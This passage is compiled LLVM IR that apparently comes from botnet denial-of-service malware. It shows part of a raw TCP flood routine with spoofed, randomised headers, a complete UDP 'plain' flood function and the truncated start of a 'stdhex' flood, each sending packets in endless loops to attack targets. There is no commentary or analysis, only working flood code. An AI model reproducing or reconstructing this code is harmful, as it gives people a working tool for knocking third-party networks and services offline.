  %179 = call zeroext i16 @htons(i16 zeroext %178) #7
  %180 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %181 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %180, i32 0, i32 1
  store i16 %179, i16* %181, align 2
  %182 = load i32, i32* %18, align 4
  %183 = trunc i32 %182 to i16
  %184 = call zeroext i16 @htons(i16 zeroext %183) #7
  %185 = zext i16 %184 to i32
  %186 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %187 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %186, i32 0, i32 2
  store i32 %185, i32* %187, align 4
  %188 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %189 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %188, i32 0, i32 4
  %190 = load i16, i16* %189, align 4
  %191 = and i16 %190, -241
  %192 = or i16 %191, 160
  store i16 %192, i16* %189, align 4
  %193 = load i8, i8* %20, align 1
  %194 = sext i8 %193 to i16
  %195 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %196 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %195, i32 0, i32 4
  %197 = load i16, i16* %196, align 4
  %198 = and i16 %194, 1
  %199 = shl i16 %198, 13
  %200 = and i16 %197, -8193
  %201 = or i16 %200, %199
  store i16 %201, i16* %196, align 4
  %202 = load i8, i8* %21, align 1
  %203 = sext i8 %202 to i16
  %204 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 4
  %206 = load i16, i16* %205, align 4
  %207 = and i16 %203, 1
  %208 = shl i16 %207, 12
  %209 = and i16 %206, -4097
  %210 = or i16 %209, %208
  store i16 %210, i16* %205, align 4
  %211 = load i8, i8* %22, align 1
  %212 = sext i8 %211 to i16
  %213 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 4
  %215 = load i16, i16* %214, align 4
  %216 = and i16 %212, 1
  %217 = shl i16 %216, 11
  %218 = and i16 %215, -2049
  %219 = or i16 %218, %217
  store i16 %219, i16* %214, align 4
  %220 = load i8, i8* %23, align 1
  %221 = sext i8 %220 to i16
  %222 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 4
  %224 = load i16, i16* %223, align 4
  %225 = and i16 %221, 1
  %226 = shl i16 %225, 10
  %227 = and i16 %224, -1025
  %228 = or i16 %227, %226
  store i16 %228, i16* %223, align 4
  %229 = load i8, i8* %24, align 1
  %230 = sext i8 %229 to i16
  %231 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %232 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %231, i32 0, i32 4
  %233 = load i16, i16* %232, align 4
  %234 = and i16 %230, 1
  %235 = shl i16 %234, 9
  %236 = and i16 %233, -513
  %237 = or i16 %236, %235
  store i16 %237, i16* %232, align 4
  %238 = load i8, i8* %25, align 1
  %239 = sext i8 %238 to i16
  %240 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 4
  %242 = load i16, i16* %241, align 4
  %243 = and i16 %239, 1
  %244 = shl i16 %243, 8
  %245 = and i16 %242, -257
  %246 = or i16 %245, %244
  store i16 %246, i16* %241, align 4
  %247 = load i8*, i8** %29, align 8
  %248 = getelementptr inbounds i8, i8* %247, i32 1
  store i8* %248, i8** %29, align 8
  store i8 2, i8* %247, align 1
  %249 = load i8*, i8** %29, align 8
  %250 = getelementptr inbounds i8, i8* %249, i32 1
  store i8* %250, i8** %29, align 8
  store i8 6, i8* %249, align 1
  %251 = call i32 @rand_next()
  %252 = and i32 %251, 15
  %253 = add i32 1458, %252
  %254 = trunc i32 %253 to i16
  %255 = call zeroext i16 @htons(i16 zeroext %254) #7
  %256 = load i8*, i8** %29, align 8
  %257 = bitcast i8* %256 to i16*
  store i16 %255, i16* %257, align 2
  %258 = load i8*, i8** %29, align 8
  %259 = getelementptr inbounds i8, i8* %258, i64 2
  store i8* %259, i8** %29, align 8
  %260 = load i8*, i8** %29, align 8
  %261 = getelementptr inbounds i8, i8* %260, i32 1
  store i8* %261, i8** %29, align 8
  store i8 4, i8* %260, align 1
  %262 = load i8*, i8** %29, align 8
  %263 = getelementptr inbounds i8, i8* %262, i32 1
  store i8* %263, i8** %29, align 8
  store i8 2, i8* %262, align 1
  %264 = load i8*, i8** %29, align 8
  %265 = getelementptr inbounds i8, i8* %264, i32 1
  store i8* %265, i8** %29, align 8
  store i8 8, i8* %264, align 1
  %266 = load i8*, i8** %29, align 8
  %267 = getelementptr inbounds i8, i8* %266, i32 1
  store i8* %267, i8** %29, align 8
  store i8 10, i8* %266, align 1
  %268 = call i32 @rand_next()
  %269 = load i8*, i8** %29, align 8
  %270 = bitcast i8* %269 to i32*
  store i32 %268, i32* %270, align 4
  %271 = load i8*, i8** %29, align 8
  %272 = getelementptr inbounds i8, i8* %271, i64 4
  store i8* %272, i8** %29, align 8
  %273 = load i8*, i8** %29, align 8
  %274 = bitcast i8* %273 to i32*
  store i32 0, i32* %274, align 4
  %275 = load i8*, i8** %29, align 8
  %276 = getelementptr inbounds i8, i8* %275, i64 4
  store i8* %276, i8** %29, align 8
  %277 = load i8*, i8** %29, align 8
  %278 = getelementptr inbounds i8, i8* %277, i32 1
  store i8* %278, i8** %29, align 8
  store i8 1, i8* %277, align 1
  %279 = load i8*, i8** %29, align 8
  %280 = getelementptr inbounds i8, i8* %279, i32 1
  store i8* %280, i8** %29, align 8
  store i8 3, i8* %279, align 1
  %281 = load i8*, i8** %29, align 8
  %282 = getelementptr inbounds i8, i8* %281, i32 1
  store i8* %282, i8** %29, align 8
  store i8 3, i8* %281, align 1
  %283 = load i8*, i8** %29, align 8
  %284 = getelementptr inbounds i8, i8* %283, i32 1
  store i8* %284, i8** %29, align 8
  store i8 8, i8* %283, align 1
  br label %285

; <label>:285:                                    ; preds = %160
  %286 = load i32, i32* %9, align 4
  %287 = add nsw i32 %286, 1
  store i32 %287, i32* %9, align 4
  br label %108

; <label>:288:                                    ; preds = %108
  br label %289

; <label>:289:                                    ; preds = %436, %288
  store i32 0, i32* %9, align 4
  br label %290

; <label>:290:                                    ; preds = %433, %289
  %291 = load i32, i32* %9, align 4
  %292 = load i8, i8* %5, align 1
  %293 = zext i8 %292 to i32
  %294 = icmp slt i32 %291, %293
  br i1 %294, label %295, label %436

; <label>:295:                                    ; preds = %290
  %296 = load i8**, i8*** %11, align 8
  %297 = load i32, i32* %9, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds i8*, i8** %296, i64 %298
  %300 = load i8*, i8** %299, align 8
  store i8* %300, i8** %30, align 8
  %301 = load i8*, i8** %30, align 8
  %302 = bitcast i8* %301 to %struct.iphdr*
  store %struct.iphdr* %302, %struct.iphdr** %31, align 8
  %303 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %304 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %303, i64 1
  %305 = bitcast %struct.iphdr* %304 to %struct.tcphdr*
  store %struct.tcphdr* %305, %struct.tcphdr** %32, align 8
  %306 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %307 = load i32, i32* %9, align 4
  %308 = sext i32 %307 to i64
  %309 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %306, i64 %308
  %310 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %309, i32 0, i32 2
  %311 = load i8, i8* %310, align 4
  %312 = zext i8 %311 to i32
  %313 = icmp slt i32 %312, 32
  br i1 %313, label %314, label %335

; <label>:314:                                    ; preds = %295
  %315 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %316 = load i32, i32* %9, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %315, i64 %317
  %319 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %318, i32 0, i32 1
  %320 = load i32, i32* %319, align 4
  %321 = call i32 @ntohl(i32 %320) #7
  %322 = call i32 @rand_next()
  %323 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %324 = load i32, i32* %9, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %323, i64 %325
  %327 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %326, i32 0, i32 2
  %328 = load i8, i8* %327, align 4
  %329 = zext i8 %328 to i32
  %330 = lshr i32 %322, %329
  %331 = add i32 %321, %330
  %332 = call i32 @htonl(i32 %331) #7
  %333 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %334 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %333, i32 0, i32 9
  store i32 %332, i32* %334, align 4
  br label %335

; <label>:335:                                    ; preds = %314, %295
  %336 = load i32, i32* %26, align 4
  %337 = icmp eq i32 %336, -1
  br i1 %337, label %338, label %342

; <label>:338:                                    ; preds = %335
  %339 = call i32 @rand_next()
  %340 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %341 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %340, i32 0, i32 8
  store i32 %339, i32* %341, align 4
  br label %342

; <label>:342:                                    ; preds = %338, %335
  %343 = load i16, i16* %13, align 2
  %344 = zext i16 %343 to i32
  %345 = icmp eq i32 %344, 65535
  br i1 %345, label %346, label %352

; <label>:346:                                    ; preds = %342
  %347 = call i32 @rand_next()
  %348 = and i32 %347, 65535
  %349 = trunc i32 %348 to i16
  %350 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %351 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %350, i32 0, i32 3
  store i16 %349, i16* %351, align 4
  br label %352

; <label>:352:                                    ; preds = %346, %342
  %353 = load i16, i16* %16, align 2
  %354 = zext i16 %353 to i32
  %355 = icmp eq i32 %354, 65535
  br i1 %355, label %356, label %362

; <label>:356:                                    ; preds = %352
  %357 = call i32 @rand_next()
  %358 = and i32 %357, 65535
  %359 = trunc i32 %358 to i16
  %360 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %361 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %360, i32 0, i32 0
  store i16 %359, i16* %361, align 4
  br label %362

; <label>:362:                                    ; preds = %356, %352
  %363 = load i16, i16* %17, align 2
  %364 = zext i16 %363 to i32
  %365 = icmp eq i32 %364, 65535
  br i1 %365, label %366, label %372

; <label>:366:                                    ; preds = %362
  %367 = call i32 @rand_next()
  %368 = and i32 %367, 65535
  %369 = trunc i32 %368 to i16
  %370 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %371 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %370, i32 0, i32 1
  store i16 %369, i16* %371, align 2
  br label %372

; <label>:372:                                    ; preds = %366, %362
  %373 = load i32, i32* %18, align 4
  %374 = icmp eq i32 %373, 65535
  br i1 %374, label %375, label %379

; <label>:375:                                    ; preds = %372
  %376 = call i32 @rand_next()
  %377 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %378 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %377, i32 0, i32 2
  store i32 %376, i32* %378, align 4
  br label %379

; <label>:379:                                    ; preds = %375, %372
  %380 = load i32, i32* %19, align 4
  %381 = icmp eq i32 %380, 65535
  br i1 %381, label %382, label %386

; <label>:382:                                    ; preds = %379
  %383 = call i32 @rand_next()
  %384 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %385 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %384, i32 0, i32 3
  store i32 %383, i32* %385, align 4
  br label %386

; <label>:386:                                    ; preds = %382, %379
  %387 = load i8, i8* %20, align 1
  %388 = icmp ne i8 %387, 0
  br i1 %388, label %389, label %395

; <label>:389:                                    ; preds = %386
  %390 = call i32 @rand_next()
  %391 = and i32 %390, 65535
  %392 = trunc i32 %391 to i16
  %393 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %394 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %393, i32 0, i32 7
  store i16 %392, i16* %394, align 2
  br label %395

; <label>:395:                                    ; preds = %389, %386
  %396 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %397 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %396, i32 0, i32 7
  store i16 0, i16* %397, align 2
  %398 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %399 = bitcast %struct.iphdr* %398 to i16*
  %400 = call zeroext i16 @checksum_generic(i16* %399, i32 20)
  %401 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %402 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %401, i32 0, i32 7
  store i16 %400, i16* %402, align 2
  %403 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %404 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %403, i32 0, i32 6
  store i16 0, i16* %404, align 4
  %405 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %406 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %407 = bitcast %struct.tcphdr* %406 to i8*
  %408 = call zeroext i16 @htons(i16 zeroext 40) #7
  %409 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %405, i8* %407, i16 zeroext %408, i32 40)
  %410 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %411 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %410, i32 0, i32 6
  store i16 %409, i16* %411, align 4
  %412 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %413 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %412, i32 0, i32 1
  %414 = load i16, i16* %413, align 2
  %415 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %416 = load i32, i32* %9, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %415, i64 %417
  %419 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %418, i32 0, i32 0
  %420 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %419, i32 0, i32 1
  store i16 %414, i16* %420, align 2
  %421 = load i32, i32* %10, align 4
  %422 = load i8*, i8** %30, align 8
  %423 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %424 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %425 = load i32, i32* %9, align 4
  %426 = sext i32 %425 to i64
  %427 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %424, i64 %426
  %428 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %427, i32 0, i32 0
  %429 = bitcast %struct.sockaddr_in* %428 to %struct.sockaddr*
  store %struct.sockaddr* %429, %struct.sockaddr** %423, align 8
  %430 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %431 = load %struct.sockaddr*, %struct.sockaddr** %430, align 8
  %432 = call i64 @sendto(i32 %421, i8* %422, i64 60, i32 16384, %struct.sockaddr* %431, i32 16)
  br label %433

; <label>:433:                                    ; preds = %395
  %434 = load i32, i32* %9, align 4
  %435 = add nsw i32 %434, 1
  store i32 %435, i32* %9, align 4
  br label %290

; <label>:436:                                    ; preds = %290
  br label %289

; <label>:437:                                    ; preds = %104, %98
  ret void
}

declare zeroext i16 @checksum_generic(i16*, i32) #3

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #3

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpplain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 1458)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

; <label>:54:                                     ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 zeroext %55) #7
  store i16 %56, i16* %13, align 2
  br label %57

; <label>:57:                                     ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

; <label>:58:                                     ; preds = %170, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %173

; <label>:63:                                     ; preds = %58
  %64 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %81

; <label>:72:                                     ; preds = %63
  %73 = call i32 @rand_next()
  %74 = trunc i32 %73 to i16
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %79, i32 0, i32 1
  store i16 %74, i16* %80, align 2
  br label %90

; <label>:81:                                     ; preds = %63
  %82 = load i16, i16* %12, align 2
  %83 = call zeroext i16 @htons(i16 zeroext %82) #7
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %83, i16* %89, align 2
  br label %90

; <label>:90:                                     ; preds = %81, %72
  %91 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  store i32 %91, i32* %95, align 4
  %96 = icmp eq i32 %91, -1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %90
  ret void

; <label>:98:                                     ; preds = %90
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %99, align 4
  %100 = load i16, i16* %13, align 2
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %100, i16* %101, align 2
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  store i32 0, i32* %103, align 4
  %104 = load i32*, i32** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %110 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %110, %struct.sockaddr** %109, align 8
  %111 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %112 = load %struct.sockaddr*, %struct.sockaddr** %111, align 8
  %113 = call i32 @bind(i32 %108, %struct.sockaddr* %112, i32 16) #6
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %116

; <label>:115:                                    ; preds = %98
  br label %116

; <label>:116:                                    ; preds = %115, %98
  %117 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i64 %119
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i32 0, i32 2
  %122 = load i8, i8* %121, align 4
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %123, 32
  br i1 %124, label %125, label %151

; <label>:125:                                    ; preds = %116
  %126 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %127 = load i32, i32* %9, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i64 %128
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i32 0, i32 1
  %131 = load i32, i32* %130, align 4
  %132 = call i32 @ntohl(i32 %131) #7
  %133 = call i32 @rand_next()
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = zext i8 %139 to i32
  %141 = lshr i32 %133, %140
  %142 = add i32 %132, %141
  %143 = call i32 @htonl(i32 %142) #7
  %144 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %145 = load i32, i32* %9, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i64 %146
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i32 0, i32 0
  %149 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %148, i32 0, i32 2
  %150 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %149, i32 0, i32 0
  store i32 %143, i32* %150, align 4
  br label %151

; <label>:151:                                    ; preds = %125, %116
  %152 = load i32*, i32** %11, align 8
  %153 = load i32, i32* %9, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i32, i32* %152, i64 %154
  %156 = load i32, i32* %155, align 4
  %157 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %158 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %159 = load i32, i32* %9, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %158, i64 %160
  %162 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i32 0, i32 0
  %163 = bitcast %struct.sockaddr_in* %162 to %struct.sockaddr*
  store %struct.sockaddr* %163, %struct.sockaddr** %157, align 8
  %164 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %165 = load %struct.sockaddr*, %struct.sockaddr** %164, align 8
  %166 = call i32 @connect(i32 %156, %struct.sockaddr* %165, i32 16)
  %167 = icmp eq i32 %166, -1
  br i1 %167, label %168, label %169

; <label>:168:                                    ; preds = %151
  br label %169

; <label>:169:                                    ; preds = %168, %151
  br label %170

; <label>:170:                                    ; preds = %169
  %171 = load i32, i32* %9, align 4
  %172 = add nsw i32 %171, 1
  store i32 %172, i32* %9, align 4
  br label %58

; <label>:173:                                    ; preds = %58
  br label %174

; <label>:174:                                    ; preds = %205, %173
  store i32 0, i32* %9, align 4
  br label %175

; <label>:175:                                    ; preds = %202, %174
  %176 = load i32, i32* %9, align 4
  %177 = load i8, i8* %5, align 1
  %178 = zext i8 %177 to i32
  %179 = icmp slt i32 %176, %178
  br i1 %179, label %180, label %205

; <label>:180:                                    ; preds = %175
  %181 = load i8**, i8*** %10, align 8
  %182 = load i32, i32* %9, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds i8*, i8** %181, i64 %183
  %185 = load i8*, i8** %184, align 8
  store i8* %185, i8** %22, align 8
  %186 = load i8, i8* %15, align 1
  %187 = icmp ne i8 %186, 0
  br i1 %187, label %188, label %192

; <label>:188:                                    ; preds = %180
  %189 = load i8*, i8** %22, align 8
  %190 = load i16, i16* %14, align 2
  %191 = zext i16 %190 to i32
  call void @rand_str(i8* %189, i32 %191)
  br label %192

; <label>:192:                                    ; preds = %188, %180
  %193 = load i32*, i32** %11, align 8
  %194 = load i32, i32* %9, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds i32, i32* %193, i64 %195
  %197 = load i32, i32* %196, align 4
  %198 = load i8*, i8** %22, align 8
  %199 = load i16, i16* %14, align 2
  %200 = zext i16 %199 to i64
  %201 = call i64 @send(i32 %197, i8* %198, i64 %200, i32 16384)
  br label %202

; <label>:202:                                    ; preds = %192
  %203 = load i32, i32* %9, align 4
  %204 = add nsw i32 %203, 1
  store i32 %204, i32* %9, align 4
  br label %175

; <label>:205:                                    ; preds = %175
  br label %174
}

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare void @rand_str(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_stdhex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca [256 x i8*], align 16
  %20 = alloca i8*, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %23 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %24 = load i8, i8* %5, align 1
  %25 = zext i8 %24 to i64
  %26 = call noalias i8* @calloc(i64 %25, i64 8) #6
  %27 = bitcast i8* %26 to i8**
  store i8** %27, i8*** %10, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 4) #6
  %31 = bitcast i8* %30 to i32*
  store i32* %31, i32** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 7, i32 65535)
  %35 = trunc i32 %34 to i16
  store i16 %35, i16* %12, align 2
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 6, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
